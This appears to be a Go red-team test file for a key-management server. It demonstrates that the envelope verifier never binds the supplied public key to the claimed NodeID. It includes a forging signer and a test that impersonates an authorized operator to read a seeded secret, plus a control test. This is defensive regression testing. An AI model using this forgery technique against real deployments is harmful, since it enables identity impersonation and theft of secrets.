// Copyright (C) 2019-2026, Lux Industries Inc. All rights reserved.
// See the file LICENSE for licensing terms.

// redteam_impersonation_test.go — RED TEAM adversarial proof.
//
// FINDING (CRITICAL): the envelope verifier binds the authorized NodeID to
// the attacker-supplied env.ID.Digest and checks the signature against the
// attacker-supplied env.ID.PubKey, but NEVER checks that the digest is the
// canonical SHAKE256-384 commitment to that pubkey
// (ids.NodeIDScheme.DeriveMLDSA). Because pubkey and digest are unbound, an
// attacker who controls their OWN throwaway ML-DSA-65 key and knows any
// authorized NodeID (a PUBLIC 20-byte identifier) can mint a signature that
// verifies AS THAT NodeID — full impersonation of any validator/operator.
//
// This test encodes the SECURE invariant: a signature-valid envelope whose
// pubkey does NOT derive the claimed NodeID MUST be rejected. It FAILS on the
// current tree (proving the exploit) and passes once the verify path rebinds
// pubkey→digest.
package zapserver

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"testing"
	"time"

	mldsa "github.com/luxfi/crypto/mldsa"
	"github.com/luxfi/ids"
	"github.com/luxfi/kms/pkg/envelope"
)

// forgingSigner signs an envelope's canonical bytes binding an ARBITRARY
// FullDigest (the victim's) into the prehash, using an attacker-controlled
// ML-DSA-65 key. This is exactly what a real attacker does off-line: the
// digest construction (envelope.Digest) and domain (envelope.EnvelopeDomain)
// are public, and mldsa signing needs no secret beyond the attacker's own key.
type forgingSigner struct {
	priv        *mldsa.PrivateKey
	boundDigest ids.FullDigest
}

func (f *forgingSigner) Sign(canonical []byte) ([]byte, error) {
	d := envelope.Digest(f.boundDigest, canonical)
	return f.priv.SignCtx(nil, d, []byte(envelope.EnvelopeDomain))
}

func TestRedTeam_PubkeyDigestUnbound_Impersonation(t *testing.T) {
	// Victim: a REAL operator identity. Only its NodeID (public, 20 bytes)
	// is known to the attacker — not its private key, not its full digest.
	victim := newIdentity(t, "hanzo/kms-operator")
	defer victim.Wipe()

	// The KMS trusts victim.NodeID for both read and write.
	s := newTestServer(t, []ids.NodeID{victim.NodeID}, []ids.NodeID{victim.NodeID})
	seed(t, s, "hanzo/kms-operator", "api-key", "prod", "sk_live_TOP_SECRET")
	now := time.Unix(1_717_200_000, 0)

	// Attacker holds ONLY a throwaway ML-DSA-65 key and the victim's public
	// NodeID. They reconstruct a 48-byte digest as NodeID||zeros — the
	// trailing 28 bytes are never checked, so the victim's real full digest
	// is NOT needed.
	attackerPriv, err := mldsa.GenerateKey(rand.Reader, mldsa.MLDSA65)
	if err != nil {
		t.Fatalf("attacker keygen: %v", err)
	}
	attackerPub := attackerPriv.PublicKey.Bytes()

	var forgedDigest ids.FullDigest
	copy(forgedDigest[:], victim.NodeID[:]) // NodeID || zero-padding

	// Sanity: the attacker's pubkey is NOT the victim's — this is a genuine
	// key mismatch, not a coincidental match.
	if base64.StdEncoding.EncodeToString(attackerPub) ==
		base64.StdEncoding.EncodeToString(victim.PublicKey) {
		t.Fatalf("attacker/victim pubkeys collided — test is meaningless")
	}

	hdr := envelope.IdentityHeader{
		NodeID:      victim.NodeID,        // claim the victim's identity
		FullDigest:  forgedDigest,         // NodeID||zeros, prefix == victim NodeID
		ServicePath: "attacker/evil",      // arbitrary — never verified vs key
		PublicKey:   attackerPub,          // ATTACKER's key verifies the sig
	}
	inner := buildInner(t, getReq{Path: "hanzo/kms-operator", Name: "api-key", Env: "prod"})
	forged, err := envelope.Build(hdr, &forgingSigner{priv: attackerPriv, boundDigest: forgedDigest},
		OpSecretGet, inner, "attacker-nonce-1", now)
	if err != nil {
		t.Fatalf("build forged envelope: %v", err)
	}
	raw, err := json.Marshal(forged)
	if err != nil {
		t.Fatalf("marshal forged envelope: %v", err)
	}

	ident, payload, err := s.verifyAndAuthorize(context.Background(), raw, OpSecretGet)
	if err != nil {
		// SECURE: verifier rebound pubkey→digest and rejected the forgery.
		t.Logf("GUARD HOLDS: forged-identity envelope rejected: %v", err)
		return
	}

	// VULNERABLE: the forgery was accepted as the victim. Prove full impact
	// by exfiltrating the victim-authorized secret with the attacker's key.
	st, body, herr := s.handleGet(context.Background(), ident, payload)
	pt := ""
	if st == statusOK && herr == nil {
		var gr getResp
		_ = json.Unmarshal(body, &gr)
		if dec, e := base64.StdEncoding.DecodeString(gr.Value); e == nil {
			pt = string(dec)
		}
	}
	t.Errorf("CRITICAL IMPERSONATION: forged envelope signed by an attacker "+
		"key was accepted as victim NodeID=%s (verified ident=%s); "+
		"handleGet status=0x%02X exfiltrated secret=%q. The attacker never "+
		"held the victim's private key — only its public NodeID. Fix: the "+
		"verify path MUST recompute NodeID/FullDigest from env.ID.PubKey via "+
		"ids.NodeIDSchemeMLDSA65.DeriveMLDSA(ServiceChainID, pubkey) and "+
		"reject unless it equals env.ID.Digest (and env.ID.Node).",
		victim.NodeID, ident.String(), st, pt)
}

// TestRedTeam_ForgedNonMemberStillDenied is a control: a forged identity for
// a NodeID that is NOT in any authority set must be denied regardless. This
// isolates the impersonation break (targeting a MEMBER) from ordinary
// non-membership denial.
func TestRedTeam_ForgedNonMemberStillDenied(t *testing.T) {
	member := newIdentity(t, "hanzo/kms-operator")
	defer member.Wipe()
	s := newTestServer(t, []ids.NodeID{member.NodeID}, []ids.NodeID{member.NodeID})
	now := time.Unix(1_717_200_000, 0)

	attackerPriv, err := mldsa.GenerateKey(rand.Reader, mldsa.MLDSA65)
	if err != nil {
		t.Fatalf("keygen: %v", err)
	}
	// A random NodeID that is in no authority set.
	var strangerDigest ids.FullDigest
	if _, err := rand.Read(strangerDigest[:]); err != nil {
		t.Fatalf("rand: %v", err)
	}
	var strangerNode ids.NodeID
	copy(strangerNode[:], strangerDigest[:ids.NodeIDLen])

	hdr := envelope.IdentityHeader{
		NodeID:      strangerNode,
		FullDigest:  strangerDigest,
		ServicePath: "attacker/evil",
		PublicKey:   attackerPriv.PublicKey.Bytes(),
	}
	inner := buildInner(t, getReq{Path: "x", Name: "y", Env: "prod"})
	env, err := envelope.Build(hdr, &forgingSigner{priv: attackerPriv, boundDigest: strangerDigest},
		OpSecretGet, inner, "stranger-nonce", now)
	if err != nil {
		t.Fatalf("build: %v", err)
	}
	raw, _ := json.Marshal(env)
	if _, _, err := s.verifyAndAuthorize(context.Background(), raw, OpSecretGet); err == nil {
		t.Fatalf("non-member forged identity must be denied")
	}
}
